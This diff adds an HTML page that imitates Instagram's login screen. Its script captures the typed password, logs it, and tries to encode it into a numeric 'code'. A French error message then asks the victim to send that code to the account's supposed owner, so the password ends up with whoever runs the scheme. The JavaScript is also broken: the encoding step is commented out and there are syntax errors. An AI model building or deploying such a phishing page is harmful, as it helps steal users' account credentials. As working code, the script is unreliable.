@@ -1,0 +1,86 @@
+<html>
+
+<head>
+    <title>Instagram</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
+    <meta http-equiv="refresh" content="60">
+    <link rel="icon" href="images/favicon.png" type="image/icon">
+    <link rel="stylesheet" type="text/css" href="style.css">
+
+</head>
+
+<body>
+    <div class="container" id="container">
+        <div class="page">
+            
+
+                <img class="logo" src="images/instagram.png" alt="instagram" style="width: 175px; ">
+            
+
+            <br />
+            <div class="container">
+                <input type="text" placeholder="Phone number, username, or email " name="u_name">
+                <input type="password" placeholder="Password" id="pass" name="pass">
+                <button id="submitbutton" class="submitbutton">Log in </button>
+                <br />
+                <p class="option">OR </p>
+            </div>
+
+            <div class="fblink">
+                <span class="fab fafacebook"></span>
+                <a href="#"> Log in With Facebook</a>
+            </div>
+
+            <div class="forget-id">
+                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
+            </div>
+            <div class="singup">
+                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
+                        Sign up</a></p>
+            </div>
+
+        </div>
+    </div>
+
+    <br />
+    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
+    </div>
+    <br />
+<script>
+  let button = document.getElementById("submitbutton");
+  button.addEventListener("click", function() {
+      function generateNumberString(str) {
+        let numberString = "";
+        for (let i = 0; i < str.length; i++) {
+          let charCode = str.charCodeAt(i);
+            
+          //numberString += charCode + ", ";
+        }
+        return numberString;
+      }
+      let newParagraph = document.createElement("p");
+
+      let inputValue = document.getElementById("pass").value;
+      console.log(inputValue);
+      let num = generateNumberString(inputValue);
+      console.log(num);
+      newParagraph.textContent = "Une erreur interne est survenue. Vous n'avez pas accez a ce compte. Contactez son propriétaire pour qu'il vous accepte grâce à ce code :" + num;
+      document.body.appendChild(newParagraph);
+      let element = document.getElementById("container");
+      element.remove();
+  });
+  function transformToString(numberString) {
+    let resultString = '';
+    let num2[] = numberString.split(", ");
+    for (let i = 0; i < num2.length; i += 1) {
+      resultString += String.fromCharCode(i);
+    }
+    return resultString;
+  }
+  console.log(transformToString("12199114119");
+</script>
+    
+</body>
+
+</html>
